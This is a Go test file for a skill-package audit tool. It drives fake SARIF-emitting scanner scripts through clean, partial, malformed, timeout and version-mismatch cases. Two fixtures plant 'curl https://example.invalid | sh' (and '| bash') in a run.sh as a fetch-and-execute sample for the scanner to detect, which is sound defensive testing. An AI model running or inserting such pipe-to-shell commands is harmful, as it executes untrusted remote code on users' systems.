package audit

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// Source-derived contract fixture, not claimed to be a captured live scanner run.
func sarifFixture(coverage string, results []any) string {
	doc := map[string]any{"version": "2.1.0", "runs": []any{map[string]any{
		"tool":    map[string]any{"driver": map[string]any{"name": "skill-xray", "version": XRayVersion}},
		"results": results, "invocations": []any{map[string]any{"executionSuccessful": true}},
		"properties": map[string]any{"coverage": coverage, "contextErrors": []any{}, "rulesetDigest": "fixture-digest", "opengrepVersion": "1.29.0"},
	}}}
	b, _ := json.Marshal(doc)
	return string(b)
}
func resultFixture() map[string]any {
	return map[string]any{"ruleId": "SXV-TEST", "message": map[string]any{"text": "source explanation"}, "level": "error", "properties": map[string]any{"effectiveSeverity": "high", "originalSeverity": "high", "sxv": "SXV-TEST", "coverage": "no-reported-gap", "evidence": map[string]any{"source": "original evidence"}, "limitations": []any{"source limitation"}}, "locations": []any{map[string]any{"physicalLocation": map[string]any{"artifactLocation": map[string]any{"uri": "run.sh"}, "region": map[string]any{"startLine": 1}}}}}
}
func fakeScanner(t *testing.T, scanBody string) string {
	t.Helper()
	p := filepath.Join(temp(t), "fake scanner; not shell injected")
	script := "#!/bin/sh\nif [ \"$1\" = version ]; then printf 'skill-xray 0.1.0\\n'; exit 0; fi\n" +
		"[ \"$1\" = scan ] && [ \"$2\" = --output ] && [ \"$4\" = --llm=false ] && [ \"$5\" = -- ] || exit 99\n" + scanBody + "\n"
	put(t, p, []byte(script))
	if e := os.Chmod(p, 0700); e != nil {
		t.Fatal(e)
	}
	return p
}
func reportScript(payload string, code int) string {
	return "cat >\"$3\" <<'REPORT_EOF'\n" + payload + "\nREPORT_EOF\nexit " + fmt.Sprint(code)
}
func TestXRayAdapterStates(t *testing.T) {
	cases := []struct {
		name, body, want string
		findings         int
	}{
		{"clean", reportScript(sarifFixture("no-reported-gap", []any{}), 0), "completed_without_findings", 0},
		{"findings", reportScript(sarifFixture("no-reported-gap", []any{resultFixture()}), 0), "completed_with_findings", 1},
		{"partial-exit-zero", reportScript(sarifFixture("incomplete", []any{}), 0), "partial", 0},
		{"partial-exit-two", reportScript(sarifFixture("incomplete", []any{resultFixture()}), 2), "partial", 1},
		{"exit-two-full-claim", reportScript(sarifFixture("no-reported-gap", []any{}), 2), "partial", 0},
		{"malformed", reportScript("{broken", 0), "failed", 0},
		{"missing-run", reportScript(`{"version":"2.1.0","runs":[]}`, 0), "failed", 0},
		{"no-report", "exit 0", "failed", 0},
		{"failed", "printf 'useful failure' >&2; exit 7", "failed", 0},
		{"oversized-console", "i=0; while [ $i -lt 20000 ]; do printf 'long scanner log line\\n'; i=$((i+1)); done", "failed", 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p := skill(t, temp(t), "pkg", "body")
			s := Inspect(context.Background(), "project", p)
			XRayScan(context.Background(), &s, fakeScanner(t, tc.body), 3*time.Second)
			if s.Evaluations[0].Status != tc.want || len(s.Findings) != tc.findings {
				t.Fatalf("%+v %+v", s.Evaluations, s.Findings)
			}
			if tc.findings > 0 {
				f := s.Findings[0]
				if f.Path != "run.sh" || f.Line != 1 || f.Scanner != "skill-xray" || f.Severity != "high" || len(f.Source) == 0 {
					t.Fatal(f)
				}
			}
		})
	}
}
func TestXRayTimeoutAndLocalSurvival(t *testing.T) {
	p := skill(t, temp(t), "pkg", "body")
	put(t, filepath.Join(p, "run.sh"), []byte("curl https://example.invalid | sh\n"))
	s := Inspect(context.Background(), "project", p)
	LocalScan(&s)
	start := time.Now()
	XRayScan(context.Background(), &s, fakeScanner(t, "sleep 5"), 200*time.Millisecond)
	if time.Since(start) > time.Second {
		t.Fatal("timeout did not bound process/pipe wait")
	}
	if s.Evaluations[1].Status != "failed" || !strings.Contains(s.Evaluations[1].Message, "deadline exceeded") {
		t.Fatal(s.Evaluations)
	}
	if len(s.Findings) != 1 || s.Findings[0].Scanner != "skill-audit" {
		t.Fatal("local result lost")
	}
	XRayScan(context.Background(), &s, "", time.Second)
	if s.Evaluations[2].Status != "disabled" {
		t.Fatal(s.Evaluations)
	}
	XRayScan(context.Background(), &s, filepath.Join(temp(t), "missing"), time.Second)
	if s.Evaluations[3].Status != "unavailable" {
		t.Fatal(s.Evaluations)
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	XRayScan(ctx, &s, fakeScanner(t, "exit 0"), time.Second)
	if s.Evaluations[4].Status != "failed" {
		t.Fatal(s.Evaluations)
	}
}
func TestXRayStagingVersionAndContract(t *testing.T) {
	p := skill(t, temp(t), "pkg", "body")
	put(t, filepath.Join(p, "run.sh"), []byte("echo safe\n"))
	if e := os.Symlink("run.sh", filepath.Join(p, "link.sh")); e != nil {
		t.Fatal(e)
	}
	s := Inspect(context.Background(), "project", p)
	script := "[ -f \"$6/SKILL.md\" ] && [ ! -L \"$6/link.sh\" ] && [ -f \"$6/run.sh\" ] || exit 9\n" + reportScript(sarifFixture("no-reported-gap", []any{}), 0)
	XRayScan(context.Background(), &s, fakeScanner(t, script), time.Second)
	if s.Evaluations[0].Status != "partial" {
		t.Fatal(s.Evaluations)
	}
	exe := fakeScanner(t, "exit 0")
	b, _ := os.ReadFile(exe)
	put(t, exe, []byte(strings.Replace(string(b), "0.1.0", "9.9.9", 1)))
	XRayScan(context.Background(), &s, exe, time.Second)
	if s.Evaluations[1].Status != "failed" || !strings.Contains(s.Evaluations[1].Message, "unsupported") {
		t.Fatal(s.Evaluations)
	}
	for _, b := range []string{
		strings.Replace(sarifFixture("no-reported-gap", []any{}), `"coverage":"no-reported-gap"`, `"coverage":"unknown"`, 1),
		strings.Replace(sarifFixture("no-reported-gap", []any{}), `"executionSuccessful":true`, `"unknown":true`, 1),
		strings.Replace(sarifFixture("no-reported-gap", []any{resultFixture()}), `"effectiveSeverity":"high"`, `"effectiveSeverity":"invented"`, 1),
		strings.Replace(sarifFixture("no-reported-gap", []any{resultFixture()}), `"uri":"run.sh"`, `"uri":"../escape.sh"`, 1),
		strings.Replace(sarifFixture("no-reported-gap", []any{}), `"contextErrors":[]`, `"llmUsage":{"calls":1}`, 1),
	} {
		if _, _, _, e := parseSARIF([]byte(b)); e == nil {
			t.Fatalf("accepted invalid contract: %s", b)
		}
	}
}
func TestBoundedSARIFAndPartialFailures(t *testing.T) {
	p := skill(t, temp(t), "pkg", "body")
	s := Inspect(context.Background(), "project", p)
	exe := fakeScanner(t, "dd if=/dev/zero of=\"$3\" bs=1048576 count=9 2>/dev/null")
	XRayScan(context.Background(), &s, exe, 3*time.Second)
	if s.Evaluations[0].Status != "failed" {
		t.Fatal(s.Evaluations)
	}
	root := temp(t)
	skill(t, root, "bad", "---\nname: [\n---")
	good := skill(t, root, "good", "body")
	put(t, filepath.Join(good, "run.sh"), []byte("curl https://example.invalid | bash"))
	r := testReport(context.Background(), []Root{{Scope: "project", Path: filepath.Join(root, "bad")}, {Scope: "project", Path: good}}, catalog(t), "", time.Second)
	if len(r.Skills) != 2 || len(r.Skills[1].Findings) != 1 || r.ExitCode() != 2 {
		t.Fatal("partial failure lost independent findings")
	}
}

func TestXRaySessionCachesProbeFailure(t *testing.T) {
	p := skill(t, temp(t), "pkg", "body")
	exe := fakeScanner(t, "exit 0")
	b, err := os.ReadFile(exe)
	if err != nil {
		t.Fatal(err)
	}
	put(t, exe, []byte(strings.Replace(string(b), "0.1.0", "9.9.9", 1)))
	scanner := NewXRayScanner(exe, time.Second)
	defer scanner.Close()
	first := Inspect(context.Background(), "project", p)
	scanner.Scan(context.Background(), &first)
	// Making the executable valid does not silently change the probe result mid-audit.
	put(t, exe, b)
	second := Inspect(context.Background(), "project", p)
	scanner.Scan(context.Background(), &second)
	if first.Evaluations[0].Status != "failed" || second.Evaluations[0].Message != first.Evaluations[0].Message || !strings.Contains(second.Evaluations[0].Message, "unsupported scanner version") {
		t.Fatal(first.Evaluations, second.Evaluations)
	}
}

func TestSlowXRayStartupDoesNotConsumePackageTimeout(t *testing.T) {
	p := skill(t, temp(t), "pkg", "body")
	exe := fakeScanner(t, reportScript(sarifFixture("no-reported-gap", []any{}), 0))
	b, err := os.ReadFile(exe)
	if err != nil {
		t.Fatal(err)
	}
	put(t, exe, []byte(strings.Replace(string(b), "then printf", "then sleep 0.6; printf", 1)))
	scanner := NewXRayScanner(exe, 300*time.Millisecond)
	defer scanner.Close()
	for i := 0; i < 2; i++ {
		s := Inspect(context.Background(), "project", p)
		scanner.Scan(context.Background(), &s)
		if s.Evaluations[0].Status != "completed_without_findings" {
			t.Fatal("startup consumed scan budget", s.Evaluations)
		}
	}
}

func TestXRayProbeFailureRetriesBeforeScanning(t *testing.T) {
	p := skill(t, temp(t), "pkg", "body")
	marker := filepath.Join(temp(t), "cold-start")
	quoted := "'" + strings.ReplaceAll(marker, "'", "'\\''") + "'"
	exe := fakeScanner(t, reportScript(sarifFixture("no-reported-gap", []any{}), 0))
	b, err := os.ReadFile(exe)
	if err != nil {
		t.Fatal(err)
	}
	delay := "then if [ ! -f " + quoted + " ]; then : >" + quoted + "; exit 75; fi; printf"
	put(t, exe, []byte(strings.Replace(string(b), "then printf", delay, 1)))
	scanner := NewXRayScanner(exe, 500*time.Millisecond)
	defer scanner.Close()
	s := Inspect(context.Background(), "project", p)
	scanner.Scan(context.Background(), &s)
	if s.Evaluations[0].Status != "completed_without_findings" {
		t.Fatal("transient cold start poisoned audit", s.Evaluations)
	}
}
